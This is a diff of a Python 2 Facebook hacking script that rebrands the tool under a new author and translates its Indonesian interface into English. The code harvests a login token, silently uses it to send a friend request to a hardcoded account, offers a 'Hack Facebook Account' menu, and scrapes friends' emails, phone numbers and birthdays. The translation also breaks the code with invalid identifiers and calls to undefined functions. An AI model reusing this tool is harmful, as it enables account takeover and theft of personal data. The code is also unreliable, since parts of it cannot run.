@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by MR.RAFID
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -23,7 +23,7 @@ def jalan(z):
         time.sleep(0.01)
 
 
-logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMR.K7C8NG\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mSupport \x1b[1;91m: \x1b[1;96mInDoNeSiA CYBER ErRoR SyStEm\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mGUNAKAN DENGAN BIJAK \x1b[1;97m/ \x1b[1;96mMR.K7C8NG\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/pashayogi\x1b[0m\n[*] Decompiled by MR.K7C8NG\n'
+logo = '\x1b[1;92m\n\xe2\x95\x94\xe2\x95\xa6\xe2\x95\x97\xe2\x94\x8c\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x80\xe2\x94\x90\xe2\x94\xac\xe2\x94\x8c\xe2\x94\x80   \xe2\x95\x94\xe2\x95\x90\xe2\x95\x97\xe2\x95\x94\xe2\x95\x97 \n \xe2\x95\x91\xe2\x95\x91\xe2\x94\x9c\xe2\x94\x80\xe2\x94\xa4\xe2\x94\x9c\xe2\x94\xac\xe2\x94\x98\xe2\x94\x9c\xe2\x94\xb4\xe2\x94\x90\xe2\x94\x80\xe2\x94\x80\xe2\x94\x80\xe2\x95\xa0\xe2\x95\xa3 \xe2\x95\xa0\xe2\x95\xa9\xe2\x95\x97\n\xe2\x95\x90\xe2\x95\xa9\xe2\x95\x9d\xe2\x94\xb4 \xe2\x94\xb4\xe2\x94\xb4\xe2\x94\x94\xe2\x94\x80\xe2\x94\xb4 \xe2\x94\xb4   \xe2\x95\x9a  \xe2\x95\x9a\xe2\x95\x90\xe2\x95\x9d \x1b[1;93mv1.6\n\x1b[1;93m* \x1b[1;97mAuthor  \x1b[1;91m: \x1b[1;96mMR.RAFID\x1b[1;97m\n\x1b[1;93m* \x1b[1;97mOwner \x1b[1;91m: \x1b[1;96mSite CrAcKer\x1b[1;97m[\x1b[1;96m\x1b[1;97m] \x1b[1;97m/ \x1b[1;96mTools By \x1b[1;97m/ \x1b[1;96mMR.RAFID\n\x1b[1;93m* \x1b[1;97mGitHub  \x1b[1;91m: \x1b[1;92m\x1b[4mhttps://github.com/muhammadrafid\x1b[0m\n[*] Decompiled by MR.RAFID\n'
 
 def tik():
     titik = [
@@ -36,9 +36,9 @@ def tik():
 
 back = 0
 threads = []
-berhasil = []
-cekpoint = []
-gagal = []
+It Works = []
+Checkpoint = []
+Failed = []
 idteman = []
 idfromteman = []
 idmem = []
@@ -72,7 +72,7 @@ def login():
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Tidak ada koneksi'
+            print '\n\x1b[1;91m[!] There is no connection'
             keluar()
 
         br._factory.is_html = True
@@ -97,20 +97,20 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://youtube.com/muhammadrafu')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
-                print '\n\x1b[1;91m[!] Tidak ada koneksi'
+                print '\n\x1b[1;91m[!] There is no connection'
                 keluar()
 
         if 'checkpoint' in url:
-            print '\n\x1b[1;91m[!] \x1b[1;93mAkun kena Checkpoint'
+            print '\n\x1b[1;91m[!] \x1b[1;93mYour Account Is On Checkpoint '
             os.system('rm -rf login.txt')
             time.sleep(1)
             keluar()
         else:
-            print '\n\x1b[1;91m[!] Login Gagal'
+            print '\n\x1b[1;91m[!] Login Failed'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
@@ -122,7 +122,7 @@ def menu():
         toket = open('login.txt', 'r').read()
     except IOError:
         os.system('clear')
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -134,25 +134,26 @@ def menu():
             id = a['id']
         except KeyError:
             os.system('clear')
-            print '\x1b[1;91m[!] \x1b[1;93mSepertinya akun kena Checkpoint'
+            print '\x1b[1;91m[!] \x1b[1;93mIt looks like the account got Checkpoint'
             os.system('rm -rf login.txt')
             time.sleep(1)
             login()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[!] Tidak ada koneksi'
-            keluar()
+            print '\x1b[1;91m[!] There is no connection'
+            Exit()
 
     os.system('clear')
     print logo
     print '\x1b[1;97m\xe2\x95\x94' + 40 * '\xe2\x95\x90'
-    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Nama \x1b[1;91m: \x1b[1;92m' + nama
+    print '\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + name
+
     print '\x1b[1;97m\xe2\x95\x9a' + 40 * '\xe2\x95\x90'
-    print '\x1b[1;37;40m1. Informasi Pengguna'
-    print '\x1b[1;37;40m2. Hack Akun Facebook'
+    print '\x1b[1;37;40m1. User Information'
+    print '\x1b[1;37;40m2. Hack Facebook Account'
     print '\x1b[1;37;40m3. Bot               '
-    print '\x1b[1;37;40m4. Lainnya....       '
+    print '\x1b[1;37;40m4. Others....       '
     print '\x1b[1;37;40m5. LogOut            '
-    print '\x1b[1;31;40m0. Keluar            '
+    print '\x1b[1;31;40m0. Exit            '
     print
     pilih()
 
@@ -160,7 +161,7 @@ def menu():
 def pilih():
     zedd = raw_input('\x1b[1;91m-\xe2\x96\xba\x1b[1;97m ')
     if zedd == '':
-        print '\x1b[1;91m[!] Jangan kosong'
+        print '\x1b[1;91m[!] Don't be empty'
         pilih()
     else:
         if zedd == '1':
@@ -177,22 +178,22 @@ def pilih():
                     else:
                         if zedd == '5':
                             os.system('rm -rf login.txt')
-                            os.system('xdg-open https://www.youtube.com/nganunymous')
-                            keluar()
+                            os.system('xdg-open https://www.youtube.com/muhammadrafu')
+                            Exit()
                         else:
                             if zedd == '0':
-                                keluar()
+                                Exit()
                             else:
-                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mTidak ada'
-                                pilih()
+                                print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + zedd + ' \x1b[1;91mThere is no'
+                                select()
 
 
-def informasi():
+def information():
     os.system('clear')
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Token not found'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -200,8 +201,8 @@ def informasi():
     os.system('clear')
     print logo
     print 40 * '\x1b[1;97m\xe2\x95\x90'
-    id = raw_input('\x1b[1;91m[+] \x1b[1;92mMasukan ID\x1b[1;97m/\x1b[1;92mNama\x1b[1;91m : \x1b[1;97m')
-    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mTunggu sebentar \x1b[1;97m...')
+    id = raw_input('\x1b[1;91m[+] \x1b[1;92mUser ID\x1b[1;97m/\x1b[1;92mName\x1b[1;91m : \x1b[1;97m')
+    jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mWait a minute \x1b[1;97m...')
     r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
     cok = json.loads(r.text)
     for p in cok['data']:
@@ -210,34 +211,34 @@ def informasi():
             z = json.loads(r.text)
             print 40 * '\x1b[1;97m\xe2\x95\x90'
             try:
-                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNama\x1b[1;97m          : ' + z['name']
+                print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mName\x1b[1;97m          : ' + z['name']
             except KeyError:
-                print '\x1b[1;91m[?] \x1b[1;92mNama\x1b[1;97m          : \x1b[1;91mTidak ada'
+                print '\x1b[1;91m[?] \x1b[1;92mName\x1b[1;97m          : \x1b[1;91mThere is no'
             else:
                 try:
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mID\x1b[1;97m            : ' + z['id']
                 except KeyError:
-                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mTidak ada'
+                    print '\x1b[1;91m[?] \x1b[1;92mID\x1b[1;97m            : \x1b[1;91mThere is no'
                 else:
                     try:
                         print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mEmail\x1b[1;97m         : ' + z['email']
                     except KeyError:
-                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mTidak ada'
+                        print '\x1b[1;91m[?] \x1b[1;92mEmail\x1b[1;97m         : \x1b[1;91mThere is no'
                     else:
                         try:
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mNomor HP\x1b[1;97m      : ' + z['mobile_phone']
                         except KeyError:
-                            print '\x1b[1;91m[?] \x1b[1;92mNomor HP\x1b[1;97m      : \x1b[1;91mTidak ada'
+                            print '\x1b[1;91m[?] \x1b[1;92mNumber HP\x1b[1;97m      : \x1b[1;91mThere is no'
 
                         try:
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mLokasi\x1b[1;97m        : ' + z['location']['name']
                         except KeyError:
-                            print '\x1b[1;91m[?] \x1b[1;92mLokasi\x1b[1;97m        : \x1b[1;91mTidak ada'
+                            print '\x1b[1;91m[?] \x1b[1;92mLocation\x1b[1;97m        : \x1b[1;91mTidak ada'
 
                     try:
-                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mTanggal Lahir\x1b[1;97m : ' + z['birthday']
+                        print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mDate of birth\x1b[1;97m : ' + z['birthday']
                     except KeyError:
-                        print '\x1b[1;91m[?] \x1b[1;92mTanggal Lahir\x1b[1;97m : \x1b[1;91mTidak ada'
+                        print '\x1b[1;91m[?] \x1b[1;92mDate of birth\x1b[1;97m : \x1b[1;91mTidak ada'
 
                 try:
                     print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mSekolah\x1b[1;97m       : '
